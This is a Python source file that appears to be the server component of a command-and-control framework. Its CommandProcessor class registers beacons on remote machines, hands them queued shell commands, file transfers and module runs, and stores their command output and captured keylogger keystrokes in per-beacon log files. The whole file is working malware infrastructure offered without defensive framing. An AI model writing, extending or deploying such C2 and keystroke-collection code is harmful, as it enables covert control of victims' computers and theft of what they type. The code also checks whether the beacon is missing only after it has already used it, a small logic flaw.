from pathlib import Path
from datetime import datetime
from database import BeaconRepository
from config import ServerConfig

class CommandProcessor:
    """Processes and validates agent commands"""
    def __init__(self, beacon_repository: BeaconRepository):
        self.beacon_repository = beacon_repository

    def process_registration(self, beacon_id: str, computer_name: str, receiver_id: str = None, receiver_name: str = None) -> str:
        import utils  # Import here to avoid circular imports
        self.beacon_repository.update_beacon_status(beacon_id, 'online', computer_name, receiver_id)
        if utils.logger:
            display_name = receiver_name or receiver_id or "Unknown"
            utils.logger.log_message(f"Beacon Registration: {beacon_id} ({computer_name}) via receiver {display_name}")
        return "Registration successful"

    def process_action_request(self, beacon_id: str, receiver_id: str = None, receiver_name: str = None) -> str:
        import utils  # Import here to avoid circular imports
        beacon = self.beacon_repository.get_beacon(beacon_id)
        self.beacon_repository.update_beacon_status(beacon_id, "online", receiver_id=receiver_id)
        if not beacon.pending_command:
            if utils.logger:
                utils.logger.log_message(f"Check In: {beacon_id} - No pending commands")
            return "no_pending_commands"
        
        if not beacon:
            return ""

        command = beacon.pending_command
        self.beacon_repository.update_beacon_command(beacon_id, None)

        return self._format_command_response(command)

    def process_command_output(self, beacon_id: str, output: str = "", config=None) -> str:
        """Process command output from an agent"""
        import utils  # Import here to avoid circular imports
        if config is None:
            from config import ServerConfig
            config = ServerConfig()
        try:
            # Store the output in the agent's output file
            output_file = Path(config.LOGS_FOLDER) / f"output_{beacon_id}.txt"
            with open(output_file, 'a', encoding='utf-8') as f:
                timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                f.write(f"[{timestamp}] {output}")
            
            # Clear the pending command since received output
            self.beacon_repository.update_beacon_command(beacon_id, None)
            
            # Update the agent's output file path if needed
            beacon = self.beacon_repository.get_beacon(beacon_id)
            if beacon and not beacon.output_file:
                self.beacon_repository.update_beacon_response(
                    beacon_id,
                    str(output_file)
                )
            
            return "Output received"
        except Exception as e:
            if utils.logger:
                utils.logger.log_message(f"Command Output Error: {beacon_id} - {str(e)}")
            return f"Error processing output: {str(e)}"
        
    def process_keylogger_output(self, beacon_id: str, output: str = "", config=None) -> str:
        """Process KeyLogger output from an agent"""
        import utils  # Import here to avoid circular imports
        if config is None:
            from config import ServerConfig
            config = ServerConfig()
        try:
            output_file = Path(config.LOGS_FOLDER) / f"keylogger_output_{beacon_id}.txt"
            
            # Handle special character encodings
            special_chars = {
                "%20": " ",   # Space
                "%0A": "\n",  # Newline
                "%09": "\t",  # Tab
                "%0D": "\r",  # Carriage return
                "%08": "⌫"   # Backspace
            }
            
            # Replace encoded characters
            for encoded, char in special_chars.items():
                output = output.replace(encoded, char)
                
            with open(output_file, 'a', encoding='utf-8') as f:
                f.write(output)
                f.flush()
                
            return "KeyLogger data received"
        except Exception as e:
            if utils.logger:
                utils.logger.log_message(f"Error processing keylogger output: {e}")
            return f"Error: {e}"

    def process_download_status(self, beacon_id: str, filename: str, status: str) -> str:
        self.beacon_repository.update_beacon_response(beacon_id, f"{status}|{filename}")
        return "Status updated"

    @staticmethod
    def _format_command_response(command: str) -> str:
        """Format a command string into a pipe-delimited response format."""

        # Special handling for file operations
        if command.startswith(("download_file ", "upload_file ")):
            action, parameter = command.split(" ", 1)
            return f"{action}|{parameter}"
        
        # Handle execute_module commands
        if command.startswith("execute_module"):
            _, parameter = command.split("|", 1)
            return f"execute_module|{parameter}"
        
        # Default case for regular commands
        return f"execute_command|{command}"